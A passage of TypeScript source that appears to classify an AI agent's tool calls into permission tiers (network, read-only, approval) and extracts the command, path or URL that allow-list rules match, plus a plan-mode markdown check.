      return { ruleClass, ruleId: pattern.id, reason: pattern.reason }
    }
  }
  return null
}

/** Classify a call that carries no shell command, by the tool's own name. */
function classifyToolName(toolName: string): ClassifiedAction {
  if (NETWORK_TOOLS.has(toolName)) {
    return {
      ruleClass: "network",
      ruleId: "network-tool",
      reason: `${toolName} reaches a host this app does not control`,
    }
  }

  if (READ_ONLY_TOOLS.has(toolName)) {
    return {
      ruleClass: "read-only",
      ruleId: "read-only-tool",
      reason: `${toolName} reads without changing anything`,
    }
  }

  if (FILE_EDIT_TOOLS.has(toolName)) {
    return { ruleClass: "approval", ruleId: "file-edit", reason: `${toolName} changes a file` }
  }

  return {
    ruleClass: "approval",
    ruleId: "unclassified-tool",
    reason: `${toolName} has no classification, so it takes the middle tier`,
  }
}

/**
 * The text an allow-list rule matches against: the shell command for Bash, the
 * path for a file tool, the URL for a fetch, the pattern for a search.
 *
 * `relativePath` lets the caller pass the worktree-relative form of a path, so
 * `Edit(src/*)` matches even though the provider handed over an absolute one.
 */
export function toolMatchText(
  toolName: string,
  toolInput: Record<string, unknown>,
  relativePath?: string,
): string {
  if (toolName === "Bash" && typeof toolInput.command === "string") return toolInput.command
  if (relativePath !== undefined) return relativePath
  if (typeof toolInput.url === "string") return toolInput.url
  if (typeof toolInput.pattern === "string") return toolInput.pattern
  for (const key of PATH_INPUT_KEYS) {
    const value = toolInput[key]
    if (typeof value === "string") return value
  }
  return ""
}

/** True when a path is markdown, the one write plan mode allows. */
export function isMarkdownPath(candidate: string): boolean {
  return /\.md$/i.test(candidate)
}
